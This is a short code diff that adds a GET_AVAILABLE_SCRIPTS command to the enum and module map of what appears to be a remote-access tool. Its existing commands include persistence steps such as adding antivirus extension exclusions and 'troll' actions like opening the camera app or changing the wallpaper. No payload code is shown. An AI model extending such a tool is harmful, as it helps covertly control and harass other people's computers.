@@ -113,6 +113,7 @@ class Command(Enum):
     SHOW_WEBSITE = "SHOW_WEBSITE"
     START_WINDOW_TROLL = "START_WINDOW_TROLL"
     STOP_WINDOW_TROLL = "STOP_WINDOW_TROLL"
+    GET_AVAILABLE_SCRIPTS = "GET_AVAILABLE_SCRIPTS"
 
     # Persistence Commands
     ADD_EXTENSION_EXCLUSION = "ADD_EXTENSION_EXCLUSION"
@@ -228,6 +229,7 @@ command_to_module_map = {
     Command.SHOW_MESSAGE_BOX: "troll",
     Command.RUN_TROLL_SCRIPT: "troll",
     Command.OPEN_CAMERA_APP: "troll",
+    Command.GET_AVAILABLE_SCRIPTS: "troll",
     Command.CHANGE_WALLPAPER_HTTP: "troll",
     Command.START_WINDOW_TROLL : "window_troll",
     Command.STOP_WINDOW_TROLL : "window_troll",
